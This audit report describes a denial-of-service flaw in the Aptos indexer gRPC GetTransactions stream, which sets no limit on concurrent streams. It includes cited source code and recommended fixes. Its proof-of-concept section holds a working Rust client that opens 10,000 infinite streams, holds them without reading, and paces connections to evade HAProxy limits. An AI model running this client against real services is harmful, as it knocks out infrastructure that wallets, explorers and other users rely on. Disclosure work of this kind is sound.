# Audit Report

## Title
RawData GetTransactions Streaming RPC Vulnerable to Concurrent Stream Exhaustion Attack

## Summary
The RawData service's `GetTransactions` streaming RPC endpoint lacks concurrent stream limits, allowing malicious clients to exhaust server resources by opening thousands of concurrent streams. Each stream spawns an unbounded tokio task and creates a Redis connection, leading to resource exhaustion and denial of service.

## Finding Description
The indexer gRPC data service implements a streaming RPC endpoint `GetTransactions` that serves blockchain transaction data to clients. The implementation has a critical resource management flaw: it unconditionally spawns a new tokio task for every incoming stream request without enforcing any limits on concurrent streams per client or globally. [1](#0-0) 

When a client calls `get_transactions`, the service immediately spawns an async task that:
1. Creates a new Redis connection via `get_tokio_connection_manager()`
2. Allocates a channel buffer (default size 3)
3. Holds Arc references to shared resources
4. Runs in a loop fetching and streaming data until the client disconnects [2](#0-1) 

The gRPC server configuration also lacks HTTP/2 max concurrent streams enforcement: [3](#0-2) 

The server only configures keepalive settings but never calls `http2_max_concurrent_streams()` to limit concurrent streams. The `CONNECTION_COUNT` metric tracks connections but performs no enforcement: [4](#0-3) 

**Attack Path:**
1. Attacker opens 10,000+ concurrent GetTransactions streams from multiple connections
2. Each stream spawns a tokio task and creates a Redis connection
3. Server exhausts: file descriptors (for Redis connections), memory (channel buffers + task stacks), and tokio runtime capacity
4. Legitimate indexer clients cannot connect or receive responses
5. Monitoring services depending on transaction data fail

This breaks the **Resource Limits** invariant: "All operations must respect gas, storage, and computational limits."

## Impact Explanation
This vulnerability qualifies as **High Severity** under Aptos bug bounty criteria for the following reasons:

1. **API crashes**: The indexer gRPC service becomes unresponsive, crashing or refusing new connections when resources are exhausted
2. **Validator node slowdowns**: If the indexer runs on the same infrastructure as validators (common in fullnode deployments), resource exhaustion can impact validator performance
3. **Service availability**: Complete denial of service for indexer-dependent applications (explorers, wallets, analytics platforms)

While this affects the indexer service rather than consensus directly, the indexer is a critical infrastructure component for Aptos ecosystem applications. The attack requires minimal resources from the attacker (just network bandwidth to maintain connections) but can take down production indexer services.

## Likelihood Explanation
**Likelihood: High**

The attack is trivial to execute:
- No authentication bypass required (services expect authenticated API gateway headers but these can be obtained legitimately)
- Attack tools readily available (any gRPC client library can maintain multiple concurrent streams)
- Resource exhaustion occurs quickly (10,000 streams Ã— ~100KB per task = ~1GB memory + 10,000 Redis connections)
- Detection is difficult until service degradation occurs

The vulnerability exists in all deployments because:
- No configuration option exists to limit concurrent streams
- Default configuration has no protection
- HAProxy layer only limits total connections, not per-client streams

## Recommendation
Implement multi-layer concurrent stream protection:

**1. Configure HTTP/2 max concurrent streams:**
```rust
Server::builder()
    .http2_keepalive_interval(Some(HTTP2_PING_INTERVAL_DURATION))
    .http2_keepalive_timeout(Some(HTTP2_PING_TIMEOUT_DURATION))
    .http2_max_concurrent_streams(Some(100)) // Add this limit
    .add_service(svc)
```

**2. Add per-client stream limiting using a Semaphore:**
```rust
pub struct RawDataServerWrapper {
    // existing fields...
    max_concurrent_streams_semaphore: Arc<Semaphore>,
}

impl RawDataServerWrapper {
    pub fn new(..., max_concurrent_streams_per_client: usize) -> Self {
        Self {
            // existing fields...
            max_concurrent_streams_semaphore: Arc::new(Semaphore::new(max_concurrent_streams_per_client)),
        }
    }
}

async fn get_transactions(&self, req: Request<GetTransactionsRequest>) 
    -> Result<Response<Self::GetTransactionsStream>, Status> {
    // Acquire permit before spawning task
    let permit = self.max_concurrent_streams_semaphore
        .clone()
        .try_acquire_owned()
        .map_err(|_| Status::resource_exhausted("Too many concurrent streams"))?;
    
    // ... existing code ...
    
    tokio::spawn(async move {
        let _permit = permit; // Hold permit until task completes
        data_fetcher_task(...).await;
    });
    
    // ... rest of implementation ...
}
```

**3. Add configuration option:**
```rust
pub struct IndexerGrpcDataServiceConfig {
    // existing fields...
    #[serde(default = "IndexerGrpcDataServiceConfig::default_max_concurrent_streams")]
    pub max_concurrent_streams_per_client: usize,
}

impl IndexerGrpcDataServiceConfig {
    const fn default_max_concurrent_streams() -> usize {
        100
    }
}
```

## Proof of Concept
```rust
// PoC: Stream exhaustion attack client
use aptos_protos::indexer::v1::{raw_data_client::RawDataClient, GetTransactionsRequest};
use futures::StreamExt;
use tonic::Request;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let target_url = "http://indexer-grpc.example.com:50051";
    let num_streams = 10_000;
    
    println!("Opening {} concurrent streams to exhaust server resources...", num_streams);
    
    let mut tasks = Vec::new();
    
    for i in 0..num_streams {
        let url = target_url.to_string();
        let task = tokio::spawn(async move {
            let mut client = RawDataClient::connect(url).await?;
            
            let request = Request::new(GetTransactionsRequest {
                starting_version: Some(0),
                transactions_count: None, // Infinite stream
                batch_size: Some(1),
                transaction_filter: None,
            });
            
            // Open stream but never read from it
            let mut stream = client.get_transactions(request).await?.into_inner();
            
            println!("Stream {} opened, holding connection...", i);
            
            // Keep connection alive without consuming data
            tokio::time::sleep(tokio::time::Duration::from_secs(3600)).await;
            
            Ok::<_, tonic::Status>(())
        });
        
        tasks.push(task);
        
        // Rate limit connection opening to avoid triggering HAProxy limits
        if i % 100 == 0 {
            tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
        }
    }
    
    println!("All streams opened. Server should now be experiencing resource exhaustion.");
    println!("Monitor: Redis connections, memory usage, file descriptors, tokio runtime.");
    
    // Wait for all tasks
    for task in tasks {
        let _ = task.await;
    }
    
    Ok(())
}
```

**Expected behavior:** Server exhausts resources (memory, Redis connections, file descriptors), becomes unresponsive, and legitimate clients cannot connect or receive data.

**Verification steps:**
1. Deploy indexer gRPC service with default configuration
2. Run PoC attack client
3. Observe: `ulimit -n` file descriptor exhaustion, Redis connection errors, OOM killer, service unresponsiveness
4. Verify legitimate clients receive connection refused or timeout errors

## Notes
This vulnerability exists across all indexer gRPC service implementations:
- `indexer-grpc-data-service` (main production service)
- `indexer-grpc-data-service-v2` (v2 service)  
- `indexer-grpc-fullnode` (fullnode localnet service) [5](#0-4) 

All share the same vulnerability pattern. The gateway proxy provides no protection as it merely forwards requests without stream limiting: [6](#0-5)

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service/src/service.rs (L145-220)
```rust
    async fn get_transactions(
        &self,
        req: Request<GetTransactionsRequest>,
    ) -> Result<Response<Self::GetTransactionsStream>, Status> {
        // Get request identity. The request is already authenticated by the interceptor.
        let request_metadata = get_request_metadata(&req);
        CONNECTION_COUNT
            .with_label_values(&request_metadata.get_label_values())
            .inc();
        let request = req.into_inner();

        let transactions_count = request.transactions_count;

        // Response channel to stream the data to the client.
        let (tx, rx) = channel(self.data_service_response_channel_size);
        let current_version = match &request.starting_version {
            Some(version) => *version,
            // Live mode if starting version isn't specified
            None => self
                .in_memory_cache
                .latest_version()
                .await
                .saturating_sub(1),
        };

        let file_store_operator: Box<dyn FileStoreOperator> = self.file_store_config.create();
        let file_store_operator = Arc::new(file_store_operator);

        // Adds tracing context for the request.
        log_grpc_step(
            SERVICE_TYPE,
            IndexerGrpcStep::DataServiceNewRequestReceived,
            Some(current_version as i64),
            transactions_count.map(|v| v as i64 + current_version as i64 - 1),
            None,
            None,
            None,
            None,
            None,
            Some(&request_metadata),
        );

        let redis_client = self.redis_client.clone();
        let cache_storage_format = self.cache_storage_format;
        let request_metadata = Arc::new(request_metadata);
        let txns_to_strip_filter = self.txns_to_strip_filter.clone();
        let in_memory_cache = self.in_memory_cache.clone();
        tokio::spawn({
            let request_metadata = request_metadata.clone();
            async move {
                data_fetcher_task(
                    redis_client,
                    file_store_operator,
                    cache_storage_format,
                    request_metadata,
                    transactions_count,
                    tx,
                    txns_to_strip_filter,
                    current_version,
                    in_memory_cache,
                )
                .await;
            }
        });

        let output_stream = ReceiverStream::new(rx);
        let mut response = Response::new(Box::pin(output_stream) as Self::GetTransactionsStream);

        response.metadata_mut().insert(
            RESPONSE_HEADER_APTOS_CONNECTION_ID_HEADER,
            tonic::metadata::MetadataValue::from_str(&request_metadata.request_connection_id)
                .unwrap(),
        );
        Ok(response)
    }
}
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service/src/service.rs (L389-412)
```rust
    // Establish redis connection
    let conn = match redis_client.get_tokio_connection_manager().await {
        Ok(conn) => conn,
        Err(e) => {
            ERROR_COUNT
                .with_label_values(&["redis_connection_failed"])
                .inc();
            // Connection will be dropped anyway, so we ignore the error here.
            let _result = tx
                .send_timeout(
                    Err(Status::unavailable(
                        "[Data Service] Cannot connect to Redis; please retry.",
                    )),
                    RESPONSE_CHANNEL_SEND_TIMEOUT,
                )
                .await;
            error!(
                error = e.to_string(),
                "[Data Service] Failed to get redis connection."
            );
            return;
        },
    };
    let mut cache_operator = CacheOperator::new(conn, cache_storage_format);
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service/src/config.rs (L205-213)
```rust
                Server::builder()
                    .http2_keepalive_interval(Some(HTTP2_PING_INTERVAL_DURATION))
                    .http2_keepalive_timeout(Some(HTTP2_PING_TIMEOUT_DURATION))
                    .add_service(svc_clone)
                    .add_service(reflection_service_clone)
                    .serve(listen_address)
                    .await
                    .map_err(|e| anyhow::anyhow!(e))
            }));
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/runtime.rs (L101-104)
```rust
        let tonic_server = Server::builder()
            .http2_keepalive_interval(Some(std::time::Duration::from_secs(60)))
            .http2_keepalive_timeout(Some(std::time::Duration::from_secs(5)))
            .add_service(reflection_service_clone);
```

**File:** ecosystem/indexer-grpc/indexer-grpc-gateway/src/gateway.rs (L155-176)
```rust
async fn proxy(
    data_service_url: Extension<Url>,
    mut request: Request,
) -> Result<Response, (StatusCode, String)> {
    info!(
        data_service_url = data_service_url.as_str(),
        "Proxying request to data service: {}",
        data_service_url.as_str()
    );
    *request.uri_mut() = override_uri_with_upstream_url(request.uri(), &data_service_url)?;

    Client::builder(TokioExecutor::new())
        .http2_only(true)
        .build_http()
        .request(request)
        .await
        .map(|res| {
            let (parts, body) = res.into_parts();
            Response::from_parts(parts, axum::body::Body::new(body))
        })
        .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()))
}
```
